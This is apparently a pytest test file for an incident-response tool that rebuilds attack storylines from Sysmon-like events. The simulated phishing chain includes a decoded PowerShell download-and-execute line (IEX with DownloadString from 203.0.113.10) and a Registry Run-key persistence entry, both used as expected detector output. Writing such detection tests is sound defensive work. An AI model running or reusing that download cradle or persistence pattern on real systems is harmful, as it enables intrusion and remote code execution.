"""Story steps (§9.4), storyline gaps (§9.5) and scope (§5.7, §9.6)."""

from pathlib import Path

import pytest

from helpers.chain import EXPLORER, SYS32, Chain
from lineage_ir.analyze.filters import make_params
from lineage_ir.engine import AnalysisResult, run_analysis
from lineage_ir.models import Gap, Storyline

FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"
PREFIX = "8f3c2a71-5e4b-4d9a-a1c3-"
RUN_KEY = (
    "HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft\\Windows"
    "\\CurrentVersion\\Run\\Updater"
)


def g(tag: int) -> str:
    return f"{PREFIX}{tag:012x}"


@pytest.fixture(scope="module")
def phish() -> AnalysisResult:
    return run_analysis([FIXTURES / "phish_chain.jsonl"])


def test_s1_steps(phish: AnalysisResult) -> None:
    s1 = phish.storylines[0]
    actual = [(s.n, s.action, s.guid, s.tactic, s.technique, s.severity) for s in s1.steps]
    assert actual == [
        (1, "process_create", g(0xB1), None, None, None),
        (2, "process_create", g(0xC1), None, None, None),
        (3, "process_create", g(0xD1), "execution", "T1204.002", "high"),
        (4, "decoded", g(0xD1), None, None, None),
        (5, "process_create", g(0xE1), "execution", "T1059.001", "high"),
        (6, "decoded", g(0xE1), None, None, None),
        (7, "dns", g(0xE1), None, None, None),
        (8, "network", g(0xE1), "execution", "T1204.002", "high"),
        (9, "file_create", g(0xE1), None, None, None),
        (10, "file_create", g(0xE1), None, None, None),
        (11, "process_create", g(0xF1), None, None, None),
        (12, "network", g(0xF1), "execution", "T1204.002", "high"),
        (13, "finding", g(0xF1), "persistence", "T1547.001", "medium"),
    ]
    texts = [s.text for s in s1.steps]
    assert texts[2].startswith("winword.exe spawned cmd.exe cmd.exe /c powershell")
    assert texts[2].endswith("[CMD-001, LIN-001]")
    assert texts[3] == (
        "cmd.exe decoded: IEX (New-Object Net.WebClient).DownloadString"
        "('http://203.0.113.10/a.ps1')"
    )
    assert texts[6] == "powershell.exe resolved dl.example"
    assert texts[7] == "powershell.exe \u2192 203.0.113.10:80/tcp (dl.example) [GR-001]"
    assert texts[8] == "powershell.exe wrote C:\\Users\\Public\\upd.exe"
    assert texts[11].endswith("[GR-001, NET-001]")
    assert texts[12] == f"Registry Run key set: {RUN_KEY}"
    assert s1.steps[3].source == s1.steps[2].source
    assert s1.gaps == ()


def test_s2_steps_and_gap(phish: AnalysisResult) -> None:
    s2 = phish.storylines[1]
    actual = [(s.action, s.guid, s.technique) for s in s2.steps]
    assert actual == [
        ("finding", g(0xE1), "T1105"),
        ("process_create", g(0x91), "T1105"),
        ("process_create", g(0x92), "T1033"),
        ("process_create", g(0x93), "T1033"),
        ("process_create", g(0x94), "T1033"),
    ]
    assert s2.steps[0].text == "Dropped file later executed: C:\\Users\\Public\\upd.exe"
    assert s2.steps[1].text.endswith("[GR-003, LOC-001]")
    assert s2.gaps == (Gap(after_step=1, seconds=3470),)


def test_steps_are_numbered_in_time_order(phish: AnalysisResult) -> None:
    for story in phish.storylines:
        assert [s.n for s in story.steps] == list(range(1, len(story.steps) + 1))
        stamps = [s.ts_us for s in story.steps]
        assert stamps == sorted(stamps)
        assert story.start_us == stamps[0] and story.end_us == stamps[-1]


def test_s1_scope(phish: AnalysisResult) -> None:
    scope = phish.storylines[0].scope
    assert scope.users == ("CORP\\jdoe",)
    assert (scope.process_count, scope.ghost_count) == (5, 0)
    assert scope.files_created == ("C:\\Users\\Public\\upd.exe", "C:\\Users\\Public\\stage.dll")
    assert scope.executable_files == 2
    assert scope.registry_set == (RUN_KEY,)
    assert scope.persistence == (f"Registry Run key set \u2192 {RUN_KEY}",)
    assert scope.destinations == ("203.0.113.10:80/tcp", "198.51.100.20:443/tcp")
    assert scope.dns_names == ("dl.example", "cdn.example")
    assert scope.decoded_payloads == 2
    assert scope.review == {
        "processes": 5,
        "files": 2,
        "registry_keys": 1,
        "persistence": 1,
        "destinations": 2,
    }


def test_s2_scope(phish: AnalysisResult) -> None:
    scope = phish.storylines[1].scope
    assert scope.users == ("NT AUTHORITY\\SYSTEM",)
    assert scope.process_count == 4
    assert scope.files_created == () and scope.destinations == ()
    assert scope.review["processes"] == 4


def _single(result: AnalysisResult) -> Storyline:
    (story,) = result.storylines
    return story


def test_scope_caps_and_ordering(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Users\\Public\\tool.exe", 1, 1)
    for n in range(30):
        chain.event(11, 2, 2 + n, TargetFilename=f"C:\\Data\\note{n:02d}.txt")
    for n in range(30):
        chain.event(11, 2, 40 + n, TargetFilename=f"C:\\Data\\bin{n:02d}.exe")
    chain.event(11, 2, 80, TargetFilename="C:\\Data\\note00.txt")
    chain.event(13, 2, 90, EventType="SetValue", TargetObject="HKCU\\Software\\App\\Color")
    chain.event(
        13,
        2,
        91,
        EventType="SetValue",
        TargetObject="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\tool",
        Details="C:\\Users\\Public\\tool.exe",
    )
    for n in range(60):
        chain.connect(2, 100 + n, f"203.0.113.{n}", Image="C:\\Users\\Public\\tool.exe")
    scope = _single(run_analysis([chain.write(tmp_path / "in.jsonl")])).scope
    assert len(scope.files_created) == 50
    assert scope.files_created[:30] == tuple(f"C:\\Data\\bin{n:02d}.exe" for n in range(30))
    assert scope.files_created[30] == "C:\\Data\\note00.txt"
    assert scope.executable_files == 30
    assert scope.registry_set == (
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\tool",
        "HKCU\\Software\\App\\Color",
    )
    assert len(scope.destinations) == 50
    assert scope.destinations[0] == "203.0.113.0:443/tcp"
    assert scope.review["files"] == 60
    assert scope.review["destinations"] == 60


def test_first_occurrence_rules_for_activity_steps(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Users\\Public\\tool.exe", 1, 1)
    chain.connect(2, 2, "203.0.113.5", Image="C:\\Users\\Public\\tool.exe")
    chain.connect(2, 3, "203.0.113.5", Image="C:\\Users\\Public\\tool.exe")
    chain.event(22, 2, 4, QueryName="a.example", Image="C:\\Users\\Public\\tool.exe")
    chain.event(22, 2, 5, QueryName="a.example", Image="C:\\Users\\Public\\tool.exe")
    chain.event(11, 2, 6, TargetFilename="C:\\Data\\x.txt")
    chain.event(11, 2, 7, TargetFilename="C:\\Data\\x.ps1")
    chain.event(11, 2, 8, TargetFilename="C:\\Data\\x.ps1")
    actions = [s.action for s in _single(run_analysis([chain.write(tmp_path / "in.jsonl")])).steps]
    assert actions == ["process_create", "network", "dns", "file_create"]


def test_gap_threshold_follows_the_option(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Users\\Public\\tool.exe", 1, 0)
    chain.create(3, SYS32 + "cmd.exe", 2, 300)
    path = chain.write(tmp_path / "in.jsonl")
    assert _single(run_analysis([path])).gaps == ()
    gaps = _single(run_analysis([path], make_params(gap="5m"))).gaps
    assert gaps == (Gap(after_step=1, seconds=300),)
